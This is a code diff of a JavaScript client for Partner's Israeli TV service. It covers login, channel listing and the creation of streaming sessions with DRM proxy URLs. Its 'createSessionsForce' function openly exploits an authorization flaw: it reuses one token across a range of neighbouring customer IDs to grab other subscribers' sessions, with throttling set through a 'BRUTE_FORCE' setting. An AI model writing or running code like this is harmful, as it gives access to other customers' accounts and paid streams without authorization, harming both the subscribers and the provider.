@@ -1,12 +1,17 @@
 import soap from 'soap';
 import xml from 'xml';
 import axios from 'axios';
+import promiseAny from 'promise-any';
 
 import {login as accountLogin, getTvContractAuthKeys, getTvContractsData} from './my-partner.js';
+import PromiseThrottle from 'promise-throttle';
 
-const PUB_BASE_URL = 'https://pub.partner.co.il';
-const PLUSH_BASE_URL = 'https://plush.partner.co.il';
-const SNO_BASE_URL = 'https://sno.partner.co.il';
+const BASE_URL = 'partner.co.il';
+
+const PUB_BASE_URL = `https://pub.${BASE_URL}`;
+const PLUSH_BASE_URL = `https://plush.${BASE_URL}`;
+const IFSHY_BASE_URL = `https://ifshy.${BASE_URL}`;
+const SNO_BASE_URL = `https://sno.${BASE_URL}`;
 
 const getUserTvData = async (idNumber, lastDigits) => {
     const userAuth = await accountLogin(idNumber, lastDigits);
@@ -65,7 +70,7 @@ export const login = async (idNumber, lastDigits, password) => {
 
     // Trying all tv accounts with the given password and waiting for the first successfull one
     try {
-        return await Promise.any(tvContracts.map(x => loginToTvContract(loginSoapClient, x, password)));
+        return await promiseAny(tvContracts.map(x => loginToTvContract(loginSoapClient, x, password)));
     } catch (aggregateError) {
         throw aggregateError.errors[0];
     }
@@ -78,6 +83,18 @@ const xmlRequest = (token, config) => axios.request({
     headers: { ...generateTokenHeader(token), 'Content-Type': 'text/xml', ...(config.headers || {}) },
     data: xml(config.data)
 });
+
+const queryTraxis = (path, requestConfig, token) => {
+    const config = {
+        method: 'POST',
+        url: `${PUB_BASE_URL}/traxis/web${path}`,
+        ...requestConfig
+    };
+
+    config.params = {...(config.params || {}), Output: 'json'};
+
+    return xmlRequest(token, config);
+};
 
 export const getChannels = async ({ userId, token }) => {
     const queryData = {
@@ -92,13 +109,7 @@ export const getChannels = async ({ userId, token }) => {
         ]
     };
 
-    const config = {
-        method: 'POST',
-        url: `${PUB_BASE_URL}/traxis/web/Channels?Output=json`,
-        data: queryData
-    };
-
-    const { data: { Channels: { Channel = [] } = {} } = {} } = await xmlRequest(token, config);
+    const { data: { Channels: { Channel = [] } = {} } = {} } = await queryTraxis('/Channels', {data: queryData}, token);
 
     return Channel.map(x => {
         const logoPicture = x.Pictures.Picture.find(y => y.type === 'Logo');
@@ -108,26 +119,31 @@ export const getChannels = async ({ userId, token }) => {
     });
 };
 
-export const createSession = async (channelId, { userId, token }, isForTv = false) => {
+
+export const searchPrograms = async ({ userId, token }) => {
+    // TODO: implememnt according to this:
+    // /epg/programs?device=62&locale=en_US&in_channel=61194865&page=1&limit=400&gt_begin=2021-05-06T21%3A00%3A00&lt_begin=2021-05-07T20%3A59%3A59
+};
+
+const createSession = async (channelId, { userId, token }, isForTv = false) => {
     const creationData = {
         CreateSession: [
             { ChannelId: channelId }
         ]
     };
 
+    const drm = `${SNO_BASE_URL}/WV/Proxy/DRM?AssetId=${channelId}&RequestType=1&DeviceUID=&RootStatus=false&DRMLevel=3&Roaming=false`;
+
     const config = {
-        method: 'POST',
-        url: `${PUB_BASE_URL}/traxis/web/Session/propset/all?CustomerId=${userId}&SeacToken=${token}&SeacClass=personal&Output=json`,
+        params: {CustomerId: userId, SeacToken: token, SeacClass: 'personal'},
         data: creationData,
         ...(isForTv ? {} : {headers: {'User-Agent': 'iFeelSmart-Android_MOBILE_AVC_L3'}})
     };
 
-    const drm = `${SNO_BASE_URL}/WV/Proxy/DRM?AssetId=${channelId}&RequestType=1&DeviceUID=&RootStatus=false&DRMLevel=3&Roaming=false`;
-
     try {
-        const {data} = await xmlRequest(token, config);
+        const {data} = await queryTraxis('/Session/propset/all', config, token);;
 
-        return {dashUrl: data.Session.Playlist.Channel.Value, drm};
+        return {dashUrl: data.Session.Playlist.Channel.Value, name: `${isForTv ? 'TV' : 'Mobile'}_${userId}`, drm};
     } catch (err) {
         const error = new Error(err.response.data.Error.Message);
         error.additionalData = {...err.response.data.Error};
@@ -136,32 +152,34 @@ export const createSession = async (channelId, { userId, token }, isForTv = fals
     }
 };
 
+export const createSessions = (...params) => {
+    const tvSession = createSession(...params, true);
+    const mobileSession = createSession(...params);
+
+    return Promise.all([tvSession, mobileSession]);
+};
+
 // This exploits a vulnerability where the same token can be used to fetch any user's session
-export const createSessionForce = async (channelId, {userId: strUserId, token}) => {
+export const createSessionsForce = async (channelId, {userId: strUserId, token}) => {
     const NUMBER_OF_TRIES = parseInt(process.env.BRUTE_FORCE_TRIES) ?? 50;
     const TRIES_EACH_DIRECTION = NUMBER_OF_TRIES / 2;
     const WAIT = parseInt(process.env.BRUTE_FORCE_WAIT_MS) ?? 250;
     const userId = parseInt(strUserId); 
 
-    const result = [];
- 
+    const promiseThrottle = new PromiseThrottle({requestsPerSecond: WAIT === 0 ? Number.MAX_SAFE_INTEGER : 1000 / WAIT});
+
+    const promises = [];
+
     for (let i = userId - TRIES_EACH_DIRECTION; i <= userId + TRIES_EACH_DIRECTION; i++) {
-        try {
-            const tvSession = createSession(channelId, {userId: i, token}, true);
-            const mobileSession = createSession(channelId, {userId: i, token});
+        const pt = promiseThrottle.add(() => createSessions(channelId, { userId: i, token })
+            .then(sessions => {
+                console.log(sessions);
 
-            const sessions = await Promise.all([tvSession, mobileSession]);
-            
-            console.log(sessions);
+                return sessions;
+            }));
 
-            result.push(...sessions.map(x => ({...x, userId: i})));
-        } catch {
-            // Ignore this error
-        }
-         finally {
-            await new Promise(resolve => setTimeout(resolve, WAIT));
-        }
+        promises.push(pt);
     }
 
-    return result;;
+    return promiseAny(promises).catch(() => []);
 };
